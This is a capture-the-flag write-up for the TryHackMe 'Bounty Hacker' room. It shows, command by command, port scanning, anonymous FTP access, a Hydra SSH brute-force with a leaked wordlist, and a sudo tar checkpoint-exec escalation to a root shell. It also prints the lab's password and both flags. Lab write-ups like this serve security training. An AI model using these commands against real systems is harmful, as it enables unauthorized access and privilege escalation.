# 🤠 Bounty Hacker — TryHackMe Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=flat-square)
![Category](https://img.shields.io/badge/Category-Enumeration%20%7C%20FTP%20%7C%20Brute--Force%20%7C%20Privesc-blue?style=flat-square)
![Status](https://img.shields.io/badge/Status-Pwned-red?style=flat-square)
![Author](https://img.shields.io/badge/Author-Obada%20Hamed-181717?style=flat-square)

---

## 🗺️ Attack Path

```
Nmap Scan → Anonymous FTP → Wordlist + Username Discovery
→ SSH Brute-Force (Hydra) → User Flag → Sudo Privesc (tar) → Root Flag
```

---

## 1. Enumeration

```bash
sudo rustscan -a <target-ip> -- -A -sC -sV
# Or alternatively:
sudo nmap <target-ip> -A -sC -sV
```

**Open ports:**

| Port | Service |
|------|---------|
| 21 | FTP |
| 22 | SSH |
| 80 | HTTP |

---

## 2. FTP — Anonymous Login

```bash
ftp <target-ip>
# Username: anonymous
# Password: (blank)

ftp> passive
ftp> get locks.txt
ftp> get task.txt
```

**Findings:**
- `locks.txt` — password wordlist
- `task.txt` — note written by user **lin**

---

## 3. SSH Brute-Force

```bash
hydra -l lin -P locks.txt ssh://<target-ip>
```

**Credentials found:**
```
Username: lin
Password: RedDr4gonSynd1cat3
```

---

## 4. User Flag

```bash
ssh lin@<target-ip>
cat user.txt
```

```
THM{CR1M3_SyNd1C4T3}
```

---

## 5. Privilege Escalation — sudo tar

```bash
sudo -l
# (ALL!root) /bin/tar
```

User can run `tar` as root. Using [GTFOBins](https://gtfobins.github.io/gtfobins/tar/):

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

✅ Root shell obtained.

---

## 6. Root Flag

```bash
cd /root
cat root.txt
```

```
THM{80UN7Y_h4cK3r}
```

---

## 📋 Summary

| Step | Technique | Tool |
|------|-----------|------|
| Recon | Port scanning | Nmap / RustScan |
| Initial Access | Anonymous FTP | ftp |
| Credential Attack | SSH brute-force | Hydra |
| Privilege Escalation | Sudo misconfiguration (`tar`) | GTFOBins |

> **Key lesson:** Anonymous FTP is a goldmine. Always check it first. And `sudo -l` is the first command after getting a shell — misconfigured sudo is one of the most common privesc vectors.
